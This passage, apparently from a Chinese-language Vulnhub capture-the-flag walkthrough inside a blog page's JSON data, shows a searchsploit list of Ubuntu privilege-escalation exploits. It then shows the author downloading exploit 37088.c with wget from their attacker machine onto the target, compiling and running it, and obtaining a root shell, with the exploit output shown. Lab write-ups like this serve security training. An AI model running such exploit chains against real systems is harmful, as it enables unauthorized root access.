class=\"hljs-number\">64</span>/local/<span class=\"hljs-number\">47170.</span>c\nLinux Kernel &#x3C; <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">83</span> / &#x3C; <span class=\"hljs-number\">4.8</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">58</span> (Ubuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">16.04</span>) - Local Privilege Escalation (KASLR / SMEP)                                                                                       | linux/local/<span class=\"hljs-number\">43418.</span>c\nLinux Kernel &#x3C; <span class=\"hljs-number\">4.4</span><span class=\"hljs-number\">.0</span>/ &#x3C; <span class=\"hljs-number\">4.8</span><span class=\"hljs-number\">.0</span> (Ubuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">16.04</span> / Linux Mint <span class=\"hljs-number\">17</span>/<span class=\"hljs-number\">18</span> / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                                                   | linux/local/<span class=\"hljs-number\">47169.</span>c\nNetKit FTP Client (Ubuntu <span class=\"hljs-number\">14.04</span>) - Crash/Denial of Service (PoC)                                                                                                                            | linux/dos/<span class=\"hljs-number\">37777.</span>txt\nUbuntu <span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">15.10</span> - User Namespace Overlayfs Xattr SetGID Privilege Escalation                                                                                                             | linux/local/<span class=\"hljs-number\">41762.</span>txt\nUbuntu &#x3C; <span class=\"hljs-number\">15.10</span> - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                                                      | linux/local/<span class=\"hljs-number\">41760.</span>txt\nusb-creator <span class=\"hljs-number\">0.2</span>.x (Ubuntu <span class=\"hljs-number\">12.04</span>/<span class=\"hljs-number\">14.04</span>/<span class=\"hljs-number\">14.10</span>) - Local Privilege Escalation                                                                                                                   | linux/local/<span class=\"hljs-number\">36820.</span>txt\nWebKitGTK <span class=\"hljs-number\">2.1</span><span class=\"hljs-number\">.2</span> (Ubuntu <span class=\"hljs-number\">14.04</span>) - Heap based Buffer Overflow                                                                                                                                 | linux/local/<span class=\"hljs-number\">44204.</span>md\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n</code></pre>\n<p>第一个就是本地权限提升的，我们尝试一下 <code>37088.c</code> ，查看文件没有特殊的编译要求，我们将它下载到靶机，然后编译执行，提权成功</p>\n<pre><code class=\"hljs language-python\">$ wget <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>/<span class=\"hljs-number\">37088.</span>c\n<span class=\"hljs-number\">100</span>%[======================================>] <span class=\"hljs-number\">6</span>,027       --.-K/s   <span class=\"hljs-keyword\">in</span> 0s      \n<span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">30</span> 02:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">19</span> (<span class=\"hljs-number\">34.9</span> MB/s) - <span class=\"hljs-string\">'37088.c'</span> saved [<span class=\"hljs-number\">6027</span>/<span class=\"hljs-number\">6027</span>]\n$ gcc <span class=\"hljs-number\">37088.</span>c -o <span class=\"hljs-number\">37088</span>\ngcc <span class=\"hljs-number\">37088.</span>c -o <span class=\"hljs-number\">37088</span>\n$ ./<span class=\"hljs-number\">37088</span>\n./<span class=\"hljs-number\">37088</span>\ncreated /var/crash/_bin_sleep<span class=\"hljs-number\">.33</span>.crash\ncrasher: my pid <span class=\"hljs-keyword\">is</span> <span class=\"hljs-number\">1559</span>\napport stopped, pid = <span class=\"hljs-number\">1560</span>\ngetting pid <span class=\"hljs-number\">1559</span>\ncurrent pid = <span class=\"hljs-number\">1558.</span><span class=\"hljs-number\">.2500</span>.<span class=\"hljs-number\">.5000</span>.<span class=\"hljs-number\">.7500</span>.<span class=\"hljs-number\">.10000</span>.<span class=\"hljs-number\">.12500</span>.<span class=\"hljs-number\">.15000</span>.<span class=\"hljs-number\">.17500</span>.<span class=\"hljs-number\">.20000</span>.<span class=\"hljs-number\">.22500</span>.<span class=\"hljs-number\">.25000</span>.<span class=\"hljs-number\">.27500</span>.<span class=\"hljs-number\">.30000</span>.<span class=\"hljs-number\">.32500</span>..\n** child: current pid = <span class=\"hljs-number\">1559</span>\n** child: executing /<span class=\"hljs-built_in\">bin</span>/su\nPassword: sleeping 2s..\n\nchecker: mode <span class=\"hljs-number\">4516</span>\nwaiting <span class=\"hljs-keyword\">for</span> file to be unlinked..writing to fifo\nfifo written.. wait...\nwaiting <span class=\"hljs-keyword\">for</span> /etc/sudoers.d/core to appear..\n\nchecker: new mode <span class=\"hljs-number\">32768</span> .. done\nchecker: SIGCONT\nchecker: writing core\nchecker: done\nsuccess\n<span class=\"hljs-comment\"># id</span>\n<span class=\"hljs-string\">'id\nuid=0(root) gid=0(root) groups=0(root)\n</span></code></pre>\n</li>\n</ol>","title":"Vulnhub - SecTalks：BNE0x03 - Simple","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"SecTalks：BNE0x03 - Simple\n\n https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/\n \n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是`170`\n    \n    \n    \n2. 扫描主机开放端口\n    \n    \n    \n3. 扫描..."},"recentPosts":[{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"},{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"}]},"__N_SSG":true}